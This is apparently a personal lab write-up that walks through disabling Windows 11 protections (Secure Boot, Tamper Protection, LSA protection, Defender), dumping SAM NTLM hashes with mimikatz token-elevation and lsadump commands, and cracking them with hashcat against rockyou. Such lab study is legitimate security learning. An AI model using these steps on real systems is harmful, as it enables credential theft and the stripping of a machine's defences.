# Introduction

Credential dumping is a popular method attackers use to steal passwords from memory or files. In this lab environment, I will try the different ways of using mimikatz into dumping ntlm hashes in Windows 11 and cracking it using hashcat


## What are these tools?

* **Mimikatz**: A powerful tool that can extract plain-text passwords, hashes, PINs, and Kerberos tickets from memory.

* **Hashcat**: An advanced password recovery tool that uses GPU acceleration to crack password hashes using dictionary, brute-force, rule-based, and hybrid attacks. It's widely used for cracking NTLM, bcrypt, SHA-family, and other common hash formats.

## How can we make mimikatz work?


Given that windows 11 has already implemented a lot of good security posture we need to make our machine less secure to make mimikatz work


* Disabling secure boot

![](../z.attachments/Pasted%20image%2020250727135215.png)

* Disabling Tamper Protection

![](../z.attachments/Pasted%20image%2020250727140325.png)

* Disabling LSA-Protection - **Set - RunAsPPL = 0**

```
Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

![](../z.attachments/Pasted%20image%2020250727135742.png)

* Disabling WinDefender using regedit

![](../z.attachments/Pasted%20image%2020250727140503.png)

![](../z.attachments/Pasted%20image%2020250727140519.png)

![](../z.attachments/Pasted%20image%2020250727140531.png)

![](../z.attachments/Pasted%20image%2020250727140543.png)

* Verification

![](../z.attachments/Pasted%20image%2020250727140609.png)

* Disable core isolation
 
 ![](../z.attachments/Pasted%20image%2020250727141958.png)
# Mimikatz usage

* Clone mimikatz

https://github.com/ParrotSec/mimikatz

```
Get-ChildItem | where Name -like "mimi*"
```

![](../z.attachments/Pasted%20image%2020250727141634.png)

* Run an elevated command for mimikatz

```
Start-Process -FilePath '.\mimikatz - Shortcut.link' -Verb RunAs
```

![](../z.attachments/Pasted%20image%2020250727143206.png)

![](../z.attachments/Pasted%20image%2020250727143319.png)

* Check the available commands

```
help
```

![](../z.attachments/Pasted%20image%2020250727142206.png)

* Check the privilege 

```
priviledge::debug
```

![](../z.attachments/Pasted%20image%2020250727143421.png)

* Check the for token privilege

![](../z.attachments/Pasted%20image%2020250727143843.png)

* We need to impersonate a token that has access to kernel mode which is mostly NT Authority

```
token::list /admin
```

![](../z.attachments/Pasted%20image%2020250727144031.png)

* I decided to impersonate this token SID

![](../z.attachments/Pasted%20image%2020250727144200.png)

```
token::elevate /sid:2444 
```

![](../z.attachments/Pasted%20image%2020250727144257.png)

* Check for token privilege

```
token::whoami
```

![](../z.attachments/Pasted%20image%2020250727144443.png)
``
* Try dumping logonpasswords

```
sekurlsa::logonPasswords
```

![](../z.attachments/Pasted%20image%2020250727144644.png)

This method don't work because Win 11 blocked specific driver for mmdrv

![](../z.attachments/Pasted%20image%2020250727144744.png)


* Lets try dumping the hashes

```
lsadump::sam
```

![](../z.attachments/Pasted%20image%2020250727145143.png)

Bingo! got the hashes

# Hashcat usage

* We will try to run this one on hashcat but first lets try some hashcat commands

```
hashcat --help |grep -i ntlm
```

![](../z.attachments/Pasted%20image%2020250727150348.png)

We can see that hashcat has set 1000 for ntlm cracking

```
hashcat -m 1000 hash.txt /usr/shar/wordlists/rockyou.txt
```

![](../z.attachments/Pasted%20image%2020250727150617.png)

Machine has been pwned

![](../z.attachments/Pasted%20image%2020250727150719.png)
